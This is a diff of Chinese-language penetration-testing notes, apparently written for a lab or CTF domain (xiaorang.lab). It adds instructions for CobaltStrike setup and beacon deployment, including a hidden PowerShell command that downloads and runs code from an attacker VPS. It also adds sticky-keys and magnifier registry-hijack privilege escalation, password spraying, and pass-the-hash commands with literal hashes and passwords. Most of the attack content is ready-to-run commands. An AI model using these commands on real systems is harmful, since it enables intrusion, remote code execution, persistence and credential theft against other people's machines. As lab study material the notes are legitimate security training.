@@ -809,24 +809,91 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20231002-59c6f
 |   **比喻**    | 你去一个朋友家找他（他开门等你）。 | 你告诉朋友你的地址，让他来你家找你。 |
 
 
-## 常用C2及代理工具
+## 常用C2及代理工具的使用
 
 ### CobaltStrike
+
+#### 服务端及客户端连接
 
 服务端部署
 
 ```bash
 cd server
 chmod +x teamserver
-./teamserver VPS_IP your_passwd
+nohup ./teamserver VPS_IP your_passwd > server.log 2>&1 &
 ```
 
-本地客户端连接
+本地客户端输入以下命令，然后输个没有在线的用户名以及连接密码登录即可
 
 ```powershell
 .\cobaltstrike-client.vbs
 ```
 
+![](imgs/image-20251113103636951.png)
+
+#### 监听及上线
+
+然后我们可以创建一个监听器
+
+![](imgs/image-20251113103847540.png)
+
+![](imgs/image-20251113103936480.png)
+
+CS有两种上线方式，第一种是 `Web Delivery` 下发的方式
+
+我们可以到 菜单栏 -> Attack -> Scripted Web Delivery(S)
+
+就是这里要注意端口和`URL Path`不要和之前的冲突
+
+![](imgs/image-20251113104318265.png)
+
+然后就会生成下面这个ps1命令，我们完整复制出来，到目标靶机上执行即可上线
+
+```powershell
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://VPS_IP:PORT/a'))"
+```
+
+第二种上线的方式就是上传我们提前制作好的马，然后上线
+
+我们可以到 菜单栏 -> Payloads -> Windows Stageless Payload
+
+![](imgs/image-20251113104656076.png)
+
+![](imgs/image-20251113104915861.png)
+
+然后到上传我们生成的马到目标靶机上，执行即可上线
+
+#### 常用命令
+
+```bash
+# 执行命令
+shell whoami
+# 上传文件
+upload C:\tmp\fscan.exe (C:\Users\public\fscan.exe)
+```
+
+#### 启动socks5代理
+
+上线的主机右键 -> Pivoting -> SOCKS Server
+
+#### 进程注入
+
+我们可以查看网络连接状态，当发现有其他用户使用rdp连接了这台主机时
+
+我们可以用CS注入进程
+
+```bash
+[09/26 23:26:43] beacon> shell quser
+[09/26 23:26:43] [*] Tasked beacon to run: quser
+[09/26 23:26:43] [+] host called home, sent: 36 bytes
+[09/26 23:26:43] [+] received output:
+ 用户名                会话名             ID  状态    空闲时间   登录时间
+ john                  rdp-tcp#0           2  运行中       1:29  2025/9/26 21:57
+```
+
+![](imgs/image-20251113105822511.png)
+
+![](imgs/image-20251113105838839.png)
 
 ### vshell
 
@@ -1265,8 +1332,54 @@ C:\Users\MSSQLSERVER\Desktop\SweetPotato.exe -a "net localgroup administrators l
 C:\Users\MSSQLSERVER\Desktop\SweetPotato.exe -a "net localgroup administrators 2>&1"
 ```
 
+#### 注册表映像劫持
+
+定义：注册表映像劫持是指通过修改注册表，劫持一个合法程序的启动过程，使其转而执行另一个恶意程序。
+
+##### 粘滞键提权
+
+```powershell
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
+```
+
+修改好后锁定账户，然后在登录界面下可以通过按 Shift 键 5 次来触发，从而实现提权
+
+##### 放大镜提权
+
+```bash
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v "Debugger" /t REG_SZ /d "c:\windows\system32\cmd.exe" /f
+```
+
+修改好后锁定账户，然后点击右下角的放大镜，从而实现提权
 
 ## 域渗透
+
+### 密码喷洒
+
+在得到域内的用户名和密码后，可以尝试用密码喷洒能登录哪一台主机然后进入域内
+
+可以使用下面这几个工具进行密码喷洒：
+
+https://github.com/ropnop/kerbrute
+
+https://github.com/3gstudent/pyKerbrute
+
+如果有kali的话可以使用`crackmapexec`
+
+```bash
+proxychains crackmapexec smb 172.22.8.1/24 -u Aldrich -p 'Ald@rLMWuy7Z!#' -d xiaorang.lab
+```
+
+然后我们可以在kali下用rdp连过去，看看哪一台修改了密码后还可以登录
+
+```bash
+proxychains rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p 'Ald@rLMWuy7Z!#'
+```
+
+如果kali下比较卡的话，我们用kali修改了密码后就用Windows自带的RDP连
+
+就是这里要注意用户名是：xiaorang.lab/Aldrich
+
 
 ### DCSync攻击
 
@@ -1289,9 +1402,15 @@ kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
 然后通过哈希传递拿下域控，这里可以使用crackmapexec来进行PTH
 
 ```bash
-proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
+proxychains crackmapexec smb 172.22.1.2 -u administrator -H '10cf89a850fb1cdbe6bb432b859164c8' -d 'xiaorang.lab' -x "type Users\Administrator\flag\flag03.txt"
 ```
 
+
+### 哈希传递攻击
+
+```bash
+proxychains crackmapexec smb 172.22.8.15 -u 'WIN2016$' -H '6ff4e8e360d48860f17ac7892923ae1c' -x 'type \Users\Administrator\flag\flag03.txt'
+```
 
 ### 委派约束攻击
 
